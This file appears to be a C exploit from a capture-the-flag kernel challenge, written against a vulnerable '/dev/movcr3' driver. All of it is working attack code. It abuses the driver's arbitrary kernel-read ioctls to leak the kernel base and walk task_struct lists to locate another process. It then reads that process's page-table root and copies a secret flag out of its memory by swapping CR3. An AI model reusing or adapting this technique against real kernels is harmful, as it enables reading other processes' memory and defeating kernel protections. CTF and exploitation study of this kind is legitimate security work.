// gcc -masm=intel -static -o ex ex.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include <assert.h>
#include <sys/mman.h>

#define IOCTL_READ          0x1001
#define IOCTL_READ_WITH_CR3 0x1002

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}
struct ioctl_read_kernel_arg {
    size_t dst;
    size_t src;
    size_t n;
};

struct ioctl_read_user_arg {
    void *dst;
    void *src;
    size_t cr3_from;
    size_t cr3_to;
};

int fd;
void *phys_ptr;
uint64_t virt2phys(void *p)
{
    uint64_t virt = (uint64_t)p;

    // Assert page alignment
    assert((virt & 0xfff) == 0);

    int tmp_fd = open("/proc/self/pagemap", O_RDONLY);
    if (tmp_fd == -1)
        fatal("open");

    uint64_t offset = (virt / 0x1000) * 8;
    lseek(tmp_fd, offset, SEEK_SET);
    uint64_t phys;
    if (read(tmp_fd, &phys, 8) != 8)
        fatal("read");
    
    assert(phys & (1ULL << 63));

    // Assert page present
    phys = (phys & ((1ULL << 54) - 1)) * 0x1000 + (virt & 0xfff);
    return phys;
}

void aar(void *buf, void *addr, size_t n)
{
    struct ioctl_read_kernel_arg data = {
        .dst = buf,
        .src = addr,
        .n = n
    };

    if (ioctl(fd, IOCTL_READ, &data)) {
        printf("[IOCTL_READ] Failed :(\n");
        exit(1);
    }
}

int aar_cr3(void *dst, void *src, size_t cr3_from, size_t cr3_to) {
    struct ioctl_read_user_arg data = {
        .dst = dst,
        .src = src,
        .cr3_from = cr3_from,
        .cr3_to = cr3_to
    };
    if (ioctl(fd, IOCTL_READ_WITH_CR3, &data)) {
        printf("[IOCTL_READ_WITH_CR3] Failed :(\n");
        exit(1);
    }
}

int main()
{
    size_t kbase = 0;
    void *mm;
    size_t pgd;
    char buf[0x1000] = {0,};
    long flag[100] = {0, };
    void *pagetable_cocay;
    void *pagetable_current;
    void *phy_cocay;
    void *phy_current;
    size_t page_offset_base = 0;
    fd = open("/dev/movcr3", O_RDWR);
    if (fd == -1)
        fatal("open");

    aar(buf, (void *)0xfffffe000000000c, 0x10);
    
    kbase = *(size_t *)&buf[0x8] - 0x1008e03;
    printf("[*] kbase : 0x%lx\n", kbase);

    aar(&page_offset_base, kbase + 0x17c01f8, 0x8);

    if (prctl(PR_SET_NAME, "brwook", 0, 0, 0) != 0) fatal("prctl");
    void *current = kbase + 0x1a0c900; // 'current' of swapper
    while (1) {
        aar(buf, current, 0x720);
        printf("[.] Traversing task: 0x%016lx (%s)\n", current, buf + 0x718);

        // check that task_struct->comm is same with "init"
        if (strcmp(buf + 0x718, "init") == 0)
            break;
        
        // (task_struct->children->next - 0x550) == next task_struct of child
        current = *(size_t*)(buf + 0x540) - 0x550;
    }

    void *cocay = *(size_t *)(buf + 0x540) - 0x550;    
    current = *(size_t*)(buf + 0x548) - 0x550;
    printf("[*] Found cocay task at 0x%016lx\n", cocay);
    
    while (1) {
        aar(buf, current, 0x720);
        printf("[.] Traversing task: 0x%016lx (%s)\n", current, buf + 0x718);
        if (strcmp(buf + 0x718, "brwook") == 0)
            break;
        
        current = *(size_t*)(buf + 0x540) - 0x550;
    }

    printf("[*] Found current task at 0x%016lx\n", current);

    aar(&mm, cocay + 0x4a8, 8);
    aar(&pgd, mm + 0x80, 8);
    phy_cocay = pgd - page_offset_base;
    printf("[*] Pagetable Virtual address of cocay (0x%016lx)\n", pgd);
    printf("[*] Pagetable Physical address of cocay (0x%016lx)\n", phy_cocay);

    aar(&mm, current + 0x4a8, 8);
    aar(&pgd, mm + 0x80, 8);
    phy_current = pgd - page_offset_base;
    printf("[*] Pagetable Virtual address of current (0x%016lx)\n", pgd);
    printf("[*] Pagetable Physical address of current (0x%016lx)\n\n", phy_current);

    void *flag_addr = 0x498008;
    for (int i=0; i<10; ++i) {
        aar_cr3(&flag[i], flag_addr + i * 8, phy_current, phy_cocay);
    }
    printf("[+] FLAG : %s\n", (char *)flag);
    return 0;
}
